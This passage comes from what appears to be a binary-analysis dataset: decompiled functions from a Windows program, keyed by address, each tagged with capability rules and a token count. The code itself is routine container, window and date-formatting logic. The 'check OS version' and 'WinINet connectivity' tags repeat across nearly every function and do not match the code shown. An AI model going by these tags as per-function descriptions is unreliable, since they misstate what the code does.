        "decompiled_code": "\nvoid __fastcall fcn.0040ef10(int32_t *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    int32_t **ppiVar4;\n    \n    if (*param_1 == 0) {\n        fcn.0045780d();\n    }\n    iVar2 = param_1[1];\n    if (*(iVar2 + 0x2d) == '\\0') {\n        ppiVar3 = *(iVar2 + 8);\n        if (*(ppiVar3 + 0x2d) != '\\0') {\n            iVar2 = *(iVar2 + 4);\n            cVar1 = *(iVar2 + 0x2d);\n            while ((cVar1 == '\\0' && (param_1[1] == *(iVar2 + 8)))) {\n                param_1[1] = iVar2;\n                iVar2 = *(iVar2 + 4);\n                cVar1 = *(iVar2 + 0x2d);\n            }\n            param_1[1] = iVar2;\n            return;\n        }\n        cVar1 = *(*ppiVar3 + 0x2d);\n        ppiVar4 = *ppiVar3;\n        while (cVar1 == '\\0') {\n            cVar1 = *(*ppiVar4 + 0x2d);\n            ppiVar3 = ppiVar4;\n            ppiVar4 = *ppiVar4;\n        }\n        param_1[1] = ppiVar3;\n        return;\n    }\n    fcn.004577e9(0, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 363
    },
    "0040efb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040efb0(int32_t *param_1)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if (*param_1 == 0) {\n        fcn.0045780d();\n    }\n    piVar2 = param_1[1];\n    if (*(piVar2 + 0x2d) == '\\0') {\n        iVar3 = *piVar2;\n        if (*(iVar3 + 0x2d) == '\\0') {\n            cVar1 = *(*(iVar3 + 8) + 0x2d);\n            iVar4 = *(iVar3 + 8);\n            while (cVar1 == '\\0') {\n                cVar1 = *(*(iVar4 + 8) + 0x2d);\n                iVar3 = iVar4;\n                iVar4 = *(iVar4 + 8);\n            }\n            param_1[1] = iVar3;\n            return;\n        }\n        piVar2 = piVar2[1];\n        cVar1 = *(piVar2 + 0x2d);\n        while ((cVar1 == '\\0' && (param_1[1] == *piVar2))) {\n            param_1[1] = piVar2;\n            piVar2 = piVar2[1];\n            cVar1 = *(piVar2 + 0x2d);\n        }\n        if (*(param_1[1] + 0x2d) == '\\0') {\n            param_1[1] = piVar2;\n            return;\n        }\n    }\n    else {\n        iVar3 = piVar2[2];\n        param_1[1] = iVar3;\n        if (*(iVar3 + 0x2d) == '\\0') {\n            return;\n        }\n    }\n    fcn.004577e9(0, 0, 0, 0, 0);\n    return;\n}\n",
        "token_count": 434
    },
    "0040f9c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040f9c0(int32_t param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    *(param_1 + 0x3bc) = *(param_1 + 0x3b8);\n    *(param_1 + 0x3d0) = 1;\n    param_2[3] = param_2[3] + -3;\n    if ((param_1 == -0xfc) || (*(param_1 + 0x11c) == 0)) {\n        fcn.004173f2(0x50800080, param_2, param_1, 0x2c6);\n        iVar2 = param_1 + 0x1f8;\n        if (iVar2 != 0) {\n            iVar2 = *(param_1 + 0x1fc);\n        }\n        (*pcVar1)(*(param_1 + 0x11c), 0x30, iVar2, 1);\n    }\n    else {\n        fcn.004226bf(*param_2, param_2[1], param_2[2] - *param_2, param_2[3] - param_2[1], 1);\n    }\n    fcn.00422640(*(unaff_EDI + 8));\n    fcn.004226fd(5);\n    fcn.0042275a();\n    (*pcVar1)(*(param_1 + 0x11c), 0xb1, 0, 0xffffffff);\n    (*pcVar1)(*(param_1 + 0x11c), 0xb7, 0, 0);\n    return;\n}\n",
        "token_count": 406
    },
    "0040fc50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0040fc50(int32_t param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t unaff_EDI;\n    uchar *puVar3;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    uchar auStack16 [4];\n    uchar auStack12 [12];\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    if (param_2 != 0) {\n        puVar3 = auStack16;\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(param_1 + 0x20), puVar3);\n        (*pcVar1)(*(param_2 + 0x20), &stack0xffffffd8);\n        uVar2 = fcn.00417300(puVar3 - iStack32, unaff_EDI - iStack28, auStack12);\n        if (iStack24 == 0) {\n            return uVar2;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 242
    },
    "0040fe30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040fe30(int32_t *param_1)\n\n{\n    if (1 < *(*param_1 + -4)) {\n        fcn.00401440(*(*param_1 + -0xc));\n    }\n    return *param_1;\n}\n",
        "token_count": 63
    },
    "0040fe60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040fe60(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t **ppiVar1;\n    int32_t **ppiVar2;\n    \n    ppiVar1 = param_2[2];\n    param_2[2] = *ppiVar1;\n    if (*(*ppiVar1 + 0x2d) == '\\0') {\n        *(*ppiVar1 + 4) = param_2;\n    }\n    ppiVar1[1] = param_2[1];\n    if (param_2 == *(*(param_1 + 4) + 4)) {\n        *(*(param_1 + 4) + 4) = ppiVar1;\n        *ppiVar1 = param_2;\n        param_2[1] = ppiVar1;\n        return;\n    }\n    ppiVar2 = param_2[1];\n    if (param_2 == *ppiVar2) {\n        *ppiVar2 = ppiVar1;\n        *ppiVar1 = param_2;\n        param_2[1] = ppiVar1;\n        return;\n    }\n    ppiVar2[2] = ppiVar1;\n    *ppiVar1 = param_2;\n    param_2[1] = ppiVar1;\n    return;\n}\n",
        "token_count": 296
    },
    "004108c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.004108c0(int32_t param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    \n    puVar5 = (*(param_1 + 4))[1];\n    cVar1 = *(puVar5 + 0x2d);\n    puVar3 = *(param_1 + 4);\n    while( true ) {\n        if (cVar1 != '\\0') {\n            return puVar3;\n        }\n        if (*param_2 == 0) break;\n        iVar4 = fcn.00456b7a(puVar5[3], *param_2);\n        if (iVar4 < 0) {\n            puVar6 = puVar5[2];\n            puVar5 = puVar3;\n        }\n        else {\n            puVar6 = *puVar5;\n        }\n        cVar1 = *(puVar6 + 0x2d);\n        puVar3 = puVar5;\n        puVar5 = puVar6;\n    }\n    fcn.00401070(0x80004005);\n    pcVar2 = swi(3);\n    puVar5 = (*pcVar2)();\n    return puVar5;\n}\n",
        "token_count": 300
    },
    "00456906": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00456906(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0045839d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00411870": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411870(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4835e8;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    iStack16 = param_1;\n    piVar2 = fcn.00423280(uVar1);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    (**(*piVar2 + 0xc))();\n    uStack8 = 0;\n    if ((param_1 + 0x54 != 0) && (*(param_1 + 0x74) != 0)) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x74));\n        if (iVar3 != 0) {\n            fcn.0041fcfd(&stack0xffffffec);\n            fcn.004226fd(0);\n            uVar4 = fcn.0040fc50(param_1 + 0x54);\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, uVar4, 0);\n            if (*(iVar3 + 0x14) != 1) goto code_r0x00411932;\n            fcn.00402200(&iStack16);\n        }\n    }\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\ncode_r0x00411932:\n    piVar2 = iStack16 + -4;\n    uStack4 = 0xffffffff;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**(iStack16 + -0x10) + 4))(iStack16 + -0x10);\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 557
    },
    "00411970": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411970(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483618;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    iStack16 = param_1;\n    piVar2 = fcn.00423280(uVar1);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    (**(*piVar2 + 0xc))();\n    uStack8 = 0;\n    if ((param_1 + 0xa8 != 0) && (*(param_1 + 200) != 0)) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 200));\n        if (iVar3 != 0) {\n            fcn.0041fcfd(&stack0xffffffec);\n            fcn.004226fd(0);\n            uVar4 = fcn.0040fc50(param_1 + 0xa8);\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, uVar4, 0);\n            if (*(iVar3 + 0x14) != 2) goto code_r0x00411a38;\n            fcn.00402200(&iStack16);\n        }\n    }\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\ncode_r0x00411a38:\n    piVar2 = iStack16 + -4;\n    uStack4 = 0xffffffff;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**(iStack16 + -0x10) + 4))(iStack16 + -0x10);\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 553
    },
    "00411a80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411a80(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x483648;\n    piStack12 = *in_FS_OFFSET;\n    uVar1 = *0x4a9ec8 ^ &stack0xffffffe8;\n    *in_FS_OFFSET = &piStack12;\n    iStack16 = param_1;\n    piVar2 = fcn.00423280(uVar1);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00401070(0x80004005);\n    }\n    (**(*piVar2 + 0xc))();\n    uStack8 = 0;\n    if ((param_1 + 0x2fc != 0) && (*(param_1 + 0x31c) != 0)) {\n        iVar3 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x31c));\n        if (iVar3 != 0) {\n            fcn.0041fcfd(&stack0xffffffec);\n            fcn.004226fd(0);\n            uVar4 = fcn.0040fc50(param_1 + 0x2fc);\n            iVar3 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, uVar4, 0);\n            if (*(iVar3 + 0x14) != 3) goto code_r0x00411b48;\n            fcn.00402200(&iStack16);\n        }\n    }\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\ncode_r0x00411b48:\n    piVar2 = iStack16 + -4;\n    uStack4 = 0xffffffff;\n    LOCK();\n    iVar3 = *piVar2;\n    *piVar2 = *piVar2 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**(iStack16 + -0x10) + 4))(iStack16 + -0x10);\n    }\n    *in_FS_OFFSET = piStack12;\n    return;\n}\n",
        "token_count": 562
    },
    "00411cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411cd0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t **in_FS_OFFSET;\n    uint uStack80;\n    uint32_t uStack76;\n    uint32_t uStack56;\n    int32_t *piStack28;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4836a8;\n    piStack12 = *in_FS_OFFSET;\n    uStack76 = *0x4a9ec8 ^ &stack0xffffffb8;\n    *in_FS_OFFSET = &piStack12;\n    uStack80 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, *(param_1 + 0x3b8));\n    if ((((iVar1 != 0) && (*(iVar1 + 0x14) == 10)) && (param_1 != -0x254)) && (*(param_1 + 0x274) != 0)) {\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x274));\n        if (iVar1 != 0) {\n            fcn.0042d5ae(&stack0xffffffb8);\n            fcn.004018d0();\n            iVar1 = fcn.004573df(&stack0xffffffbc, &uStack76);\n            uVar2 = fcn.0040eb00(~-(iVar1 != 0) & uStack56);\n            uVar2 = fcn.0040ead0(uVar2);\n            fcn.00411180(&uStack80, \"%d-%02d-%02d\", uVar2);\n            fcn.00402200(&uStack80);\n            fcn.004226fd(0);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\n            fcn.00401900();\n        }\n    }\n    *in_FS_OFFSET = piStack28;\n    return;\n}\n",
        "token_count": 481
    },
    "00411e10": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411e10(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *unaff_EBX;\n    int32_t **in_FS_OFFSET;\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    uStack8 = 0x4836d8;\n    piStack12 = *in_FS_OFFSET;\n    uStack40 = *0x4a9ec8 ^ &stack0xffffffdc;\n    *in_FS_OFFSET = &piStack12;\n    uStack44 = 0;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x20), 0x199, *(param_1 + 0x3b8));\n    if ((((iVar1 != 0) && (*(iVar1 + 0x14) == 0xb)) && (param_1 != -0x2a8)) && (*(param_1 + 0x2c8) != 0)) {\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(param_1 + 0x2c8));\n        if (iVar1 != 0) {\n            fcn.0042d5ae(&stack0xffffffdc);\n            fcn.004018d0();\n            uVar2 = fcn.0040ebc0();\n            uVar2 = fcn.0040eb90(uVar2);\n            uVar2 = fcn.0040eb60(uVar2);\n            fcn.00411180(&uStack44, \"%d:%d:%d\", uVar2);\n            fcn.00402200(&uStack44);\n            fcn.004226fd(0);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x20), 0, 1);\n            fcn.00401900();\n        }\n    }\n    *in_FS_OFFSET = unaff_EBX;\n    return;\n}\n",
        "token_count": 462
    },
    "00412160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00412160(int32_t param_1, uint param_2, uint param_3, int32_t **param_4)\n\n{\n    int32_t *piVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t **ppiVar5;\n    uint uVar6;\n    int32_t **ppiVar7;\n    int32_t **ppiVar8;\n    int32_t **ppiVar9;\n    int32_t **in_FS_OFFSET;\n    int32_t **ppiVar10;\n    code *pcStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t *piStack32;\n    int32_t **ppiStack16;\n    int32_t *piStack12;\n    int32_t **ppiStack8;\n    uint uStack4;\n    \n    uStack4 = 0xffffffff;\n    ppiStack8 = 0x483798;\n    piStack12 = *in_FS_OFFSET;\n    uVar4 = *0x4a9ec8 ^ &stack0xffffff9c;\n    *in_FS_OFFSET = &piStack12;\n    if (*(param_4 + 0x2d) != '\\0') {\n        uStack56 = 0xf;\n        uStack60 = 0;\n        fcn.00403ef0(\"invalid map/set<T> iterator\", 0x1b, uVar4);\n        piStack12 = NULL;\n        fcn.00411280(&stack0xffffffa8);\n        pcStack64 = vtable.std::out_of_range.0;\n        param_4 = fcn.00456b8d(&pcStack64, 0x49e148);\n    }\n    ppiVar10 = param_4;\n    fcn.0040ef10();\n    ppiVar7 = *param_4;\n    if (*(ppiVar7 + 0x2d) == '\\0') {\n        ppiVar9 = ppiVar7;\n        if ((*(param_4[2] + 0x2d) == '\\0') && (ppiVar9 = ppiStack8[2],  ppiStack8 != param_4)) {\n            ppiVar7[1] = ppiStack8;\n            *ppiStack8 = *param_4;\n            ppiVar7 = ppiStack8;\n            if (ppiStack8 != param_4[2]) {\n                ppiVar7 = ppiStack8[1];\n                if (*(ppiVar9 + 0x2d) == '\\0') {\n                    ppiVar9[1] = ppiVar7;\n                }\n                *ppiVar7 = ppiVar9;\n                ppiStack8[2] = param_4[2];\n                param_4[2][1] = ppiStack8;\n            }\n            if (*(*(param_1 + 4) + 4) == param_4) {\n                *(*(param_1 + 4) + 4) = ppiStack8;\n            }\n            else {\n                ppiVar8 = param_4[1];\n                if (*ppiVar8 == param_4) {\n                    *ppiVar8 = ppiStack8;\n                }\n                else {\n                    ppiVar8[2] = ppiStack8;\n                }\n            }\n            ppiStack8[1] = param_4[1];\n            uVar2 = *(ppiStack8 + 0xb);\n            *(ppiStack8 + 0xb) = *(param_4 + 0xb);\n            *(param_4 + 0xb) = uVar2;\n            goto code_r0x004122d5;\n        }\n    }\n    else {\n        ppiVar9 = param_4[2];\n    }\n    ppiVar7 = param_4[1];\n    if (*(ppiVar9 + 0x2d) == '\\0') {\n        ppiVar9[1] = ppiVar7;\n    }\n    if (*(*(param_1 + 4) + 4) == param_4) {\n        *(*(param_1 + 4) + 4) = ppiVar9;\n    }\n    else if (*ppiVar7 == param_4) {\n        *ppiVar7 = ppiVar9;\n    }\n    else {\n        ppiVar7[2] = ppiVar9;\n    }\n    ppiVar8 = *(param_1 + 4);\n    if (*ppiVar8 == ppiVar10) {\n        ppiVar5 = ppiVar7;\n        if (*(ppiVar9 + 0x2d) == '\\0') {\n            ppiVar5 = fcn.0040eda0(ppiVar9);\n        }\n        *ppiVar8 = ppiVar5;\n    }\n    iVar3 = *(param_1 + 4);\n    if (*(iVar3 + 8) == ppiVar10) {\n        if (*(ppiVar9 + 0x2d) == '\\0') {\n            uVar6 = fcn.0040ed80(ppiVar9);\n            *(iVar3 + 8) = uVar6;\n        }\n        else {\n            *(iVar3 + 8) = ppiVar7;\n        }\n    }\ncode_r0x004122d5:\n    if (*(ppiVar10 + 0xb) == '\\x01') {\n        if (ppiVar9 != *(*(param_1 + 4) + 4)) {\n            do {\n                ppiVar8 = ppiVar7;\n                if (*(ppiVar9 + 0xb) != '\\x01') break;\n                ppiVar7 = *ppiVar8;\n                if (ppiVar9 == ppiVar7) {\n                    ppiVar7 = ppiVar8[2];\n                    if (*(ppiVar7 + 0xb) == '\\0') {\n                        *(ppiVar7 + 0xb) = 1;\n                        *(ppiVar8 + 0xb) = 0;\n                        fcn.0040fe60();\n                        ppiVar7 = ppiVar8[2];\n                    }\n                    if (*(ppiVar7 + 0x2d) == '\\0') {\n                        if ((*(*ppiVar7 + 0xb) != '\\x01') || (*(ppiVar7[2] + 0xb) != '\\x01')) {\n                            if (*(ppiVar7[2] + 0xb) == '\\x01') {\n                                *(*ppiVar7 + 0xb) = 1;\n                                *(ppiVar7 + 0xb) = 0;\n                                fcn.0040ede0(ppiVar7);\n                                ppiVar7 = ppiVar8[2];\n                            }\n                            *(ppiVar7 + 0xb) = *(ppiVar8 + 0xb);\n                            *(ppiVar8 + 0xb) = 1;\n                            *(ppiVar7[2] + 0xb) = 1;\n                            fcn.0040fe60(ppiVar8);\n                            break;\n                        }\ncode_r0x0041238e:\n                        *(ppiVar7 + 0xb) = 0;\n                    }\n                }\n                else {\n                    if (*(ppiVar7 + 0xb) == '\\0') {\n                        *(ppiVar7 + 0xb) = 1;\n                        *(ppiVar8 + 0xb) = 0;\n                        fcn.0040ede0();\n                        ppiVar7 = *ppiVar8;\n                    }\n                    if (*(ppiVar7 + 0x2d) == '\\0') {\n                        if ((*(ppiVar7[2] + 0xb) == '\\x01') && (*(*ppiVar7 + 0xb) == '\\x01')) goto code_r0x0041238e;\n                        if (*(*ppiVar7 + 0xb) == '\\x01') {\n                            *(ppiVar7[2] + 0xb) = 1;\n                            *(ppiVar7 + 0xb) = 0;\n                            fcn.0040fe60();\n                            ppiVar7 = *ppiVar8;\n                        }\n                        *(ppiVar7 + 0xb) = *(ppiVar8 + 0xb);\n                        *(ppiVar8 + 0xb) = 1;\n                        *(*ppiVar7 + 0xb) = 1;\n                        fcn.0040ede0(ppiVar8);\n                        break;\n                    }\n                }\n                ppiVar7 = ppiVar8[1];\n                ppiVar9 = ppiVar8;\n            } while (ppiVar8 != *(*(param_1 + 4) + 4));\n        }\n        *(ppiVar9 + 0xb) = 1;\n    }\n    fcn.004106a0();\n    ppiVar7 = ppiVar10[3] + -4;\n    piVar1 = ppiVar10[3] + -1;\n    LOCK();\n    iVar3 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar3 == 1 || iVar3 + -1 < 0) {\n        (**(**ppiVar7 + 4))(ppiVar7);\n    }\n    fcn.004170df(ppiVar10);\n    if (*(param_1 + 8) != 0) {\n        *(param_1 + 8) = *(param_1 + 8) + -1;\n    }\n    *ppiStack16 = piStack12;\n    ppiStack16[1] = ppiStack8;\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 2080
    },
    "004124f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004124f0(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    \n    cVar2 = *(param_1 + 0x2d);\n    while (cVar2 == '\\0') {\n        fcn.004124f0(param_1[2]);\n        piVar3 = *param_1;\n        fcn.004106a0();\n        ppiVar5 = param_1[3] + -0x10;\n        piVar1 = param_1[3] + -4;\n        LOCK();\n        iVar4 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar5 + 4))(ppiVar5);\n        }\n        fcn.004170df(param_1);\n        param_1 = piVar3;\n        cVar2 = *(piVar3 + 0x2d);\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "00412680": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00412680(char *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    char cVar3;\n    char **ppcVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t unaff_EBP;\n    int32_t unaff_ESI;\n    char *pcVar7;\n    int32_t **in_FS_OFFSET;\n    int32_t iVar8;\n    int32_t iStack20;\n    char *pcStack16;\n    int32_t *piStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    iStack4 = -1;\n    uStack8 = 0x483850;\n    piStack12 = *in_FS_OFFSET;\n    ppcVar4 = *0x4a9ec8 ^ &stack0xffffffe0;\n    *in_FS_OFFSET = &piStack12;\n    if ((param_1 != NULL) && (param_2 != 0)) {\n        pcStack16 = param_1;\n        do {\n            cVar3 = *pcStack16;\n            pcStack16 = pcStack16 + 1;\n        } while (cVar3 != '\\0');\n        pcStack16 = pcStack16 + -(param_1 + 1);\n        pcVar7 = NULL;\n        if (0 < pcStack16) {\n            while (iVar8 = param_2,  iVar5 = fcn.004581d0(pcVar7 + param_1, param_2),  -1 < iVar5) {\n                fcn.00402f40(iVar8, ppcVar4);\n                pcVar2 = pcVar7 + iVar5;\n                uStack8 = 0;\n                iVar8 = unaff_EBP;\n                if (pcVar2 < iStack20) {\n                    pcVar7 = *(unaff_EBP + -0xc);\n                    if (iVar5 < pcVar7) {\n                        if (1 < *(unaff_EBP + -4)) {\n                            fcn.00401440();\n                            unaff_EBP = unaff_ESI;\n                            unaff_ESI = unaff_EBP;\n                        }\n                        *(unaff_EBP + iVar5) = 0;\n                        if ((-1 < pcVar7) && (pcVar7 <= *(pcStack16 + -8))) {\n                            *(pcStack16 + -0xc) = pcVar7;\n                            pcVar7[pcStack16] = '\\0';\n                            goto code_r0x00412763;\n                        }\n                    }\ncode_r0x004127e7:\n                    ppcVar4 = 0x80070057;\n                    fcn.00401070(0x80070057);\n                    break;\n                }\ncode_r0x00412763:\n                if (pcStack16 == NULL) {\n                    iVar5 = 0;\n                }\n                else 